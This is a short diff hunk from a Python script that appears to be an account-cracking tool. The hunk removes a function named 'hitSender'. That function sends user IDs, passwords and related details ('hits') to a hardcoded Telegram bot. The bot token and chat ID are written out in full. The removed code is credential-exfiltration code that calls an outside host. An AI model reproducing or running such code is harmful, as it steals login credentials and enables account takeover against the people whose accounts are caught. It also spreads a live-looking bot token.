@@ -745,16 +745,6 @@ def gxdsAPI(uid, pxss, tl):
         input(f"{dg}  [+] PRESS ENTER TO GO BACK")
         mxnu()
 
-
-# HIT SENDER
-def hitSender(uid, ps, yrs):
-    TOKEN = "6475095868:AAHH2uGLGm5a9GswmkVor8Xn7Oz9OOMYg6o"
-    chat_id = "6542321044"
-    message = f"[GXDS HITS] {uid} : {ps} - {yrs}"
-    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={chat_id}&text={message}"
-    hxts = requests.get(url).json()
-
-
 # FORWARDER
 def gxdsBot():
     session = requests.session()
